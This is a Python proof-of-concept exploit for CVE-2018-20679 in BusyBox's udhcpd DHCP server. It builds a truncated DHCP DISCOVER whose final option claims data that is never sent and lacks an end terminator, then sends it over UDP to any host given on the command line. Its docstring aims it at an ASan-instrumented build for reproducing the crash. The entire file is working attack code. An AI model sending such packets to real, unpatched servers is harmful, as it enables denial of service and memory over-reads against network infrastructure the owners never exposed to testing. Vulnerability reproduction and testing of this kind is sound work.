#!/usr/bin/env python3
"""
PoC for CVE-2018-20679 — BusyBox udhcp out-of-bounds READ in udhcp_get_option().

CWE-125, CVSS 7.5. The bug lives in networking/udhcp/common.c and is, per the
CVE, "consumed by the DHCP server, client, and relay" — this PoC drives the
SERVER side (udhcpd, UDP 67).

Root cause: udhcp_get_option() bounds its option-chain scan against
sizeof(packet->options) (the full ~388-byte array) instead of the number of
bytes actually received off the wire. We send a DHCP DISCOVER whose option
section ends in a *truncated* option: an option header [code][len] that declares
data bytes which are NOT actually present in the datagram, and with NO DHCP_END
(0xff) terminator. The parser does:
        len = 2 + optionptr[OPT_LEN];   # 2 + 4 = 6
        optionptr += len;               # steps PAST the received bytes
        ... next loop: read optionptr[OPT_CODE]  # OOB read
so it reads past the received tail. Against the moving-fence ASan build that
tail is poisoned -> deterministic ASan abort inside udhcp_get_option / common.c.

Usage:
    python3 poc_cve_2018_20679.py [host] [port]
    defaults: 127.0.0.1 67
"""
import socket
import struct
import sys

DHCP_MAGIC = 0x63825363


def build_truncated_discover() -> bytes:
    # --- BOOTP fixed header (236 bytes) ---
    op = 1          # BOOTREQUEST
    htype = 1       # Ethernet
    hlen = 6        # MAC length
    hops = 0
    xid = 0xDEADBEEF
    secs = 0
    flags = 0x0000
    ciaddr = b"\x00\x00\x00\x00"
    yiaddr = b"\x00\x00\x00\x00"
    siaddr = b"\x00\x00\x00\x00"
    giaddr = b"\x00\x00\x00\x00"
    chaddr = b"\x11\x22\x33\x44\x55\x66" + b"\x00" * 10   # 16 bytes
    sname = b"\x00" * 64
    file_ = b"\x00" * 128

    pkt = struct.pack("!BBBB", op, htype, hlen, hops)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!H", secs)
    pkt += struct.pack("!H", flags)
    pkt += ciaddr + yiaddr + siaddr + giaddr
    pkt += chaddr + sname + file_
    assert len(pkt) == 236, len(pkt)

    # --- magic cookie (4 bytes) -> total 240 ---
    pkt += struct.pack("!I", DHCP_MAGIC)
    assert len(pkt) == 240, len(pkt)

    # --- options: one well-formed message-type, then a TRUNCATED option ---
    # 53 (DHCP message type) = DISCOVER, well-formed so the packet looks real.
    pkt += bytes([53, 1, 1])

    # Truncated trailing option: code 0x37 (param request list), len byte says
    # 4 data bytes follow, but we send NONE of them and NO 0xff terminator.
    # udhcp_get_option computes len = 2 + 4 = 6 and advances optionptr by 6,
    # landing in the un-received (poisoned) tail on the next code/len read.
    pkt += bytes([0x37, 0x04])
    # deliberately STOP here: no data bytes, no DHCP_END.
    return pkt


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 67

    payload = build_truncated_discover()
    print(f"[poc] sending {len(payload)} byte truncated DHCP DISCOVER "
          f"to {host}:{port}/udp")
    print("[poc] last option: [0x37][len=4] with NO data and NO DHCP_END "
          "(0xff) -> drives the over-read past the received boundary")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3.0)
    s.sendto(payload, (host, port))
    print("[poc] packet sent; server should ASan-abort in udhcp_get_option()")
    try:
        data, addr = s.recvfrom(2048)
        print(f"[poc] unexpected reply ({len(data)} bytes) from {addr} "
              "— server did not crash on this datagram")
    except socket.timeout:
        print("[poc] no reply (expected): server crashed or stayed silent")
    finally:
        s.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
